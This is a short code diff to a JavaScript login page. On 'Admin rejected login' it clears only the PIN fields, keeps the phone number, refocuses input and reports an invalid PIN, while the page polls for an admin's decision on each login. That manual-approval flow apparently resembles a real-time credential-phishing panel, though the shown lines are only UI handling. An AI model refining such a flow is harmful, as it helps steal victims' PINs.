@@ -910,16 +910,18 @@
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
             
-            // Clear login form
-            document.getElementById('lpPhone').value = '';
+            // Clear ONLY PIN fields - keep phone number visible
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             chkPin(); // ✅ FIX: Re-enable button state
             
             // Go back to login page
             goTo('page-login');
             
+            // Focus on first PIN field for user convenience
+            document.getElementById('lp0').focus();
+            
             // Show error message
-            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
+            showLgnMsg('error', 'Your PIN was invalid. Please try again.');
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
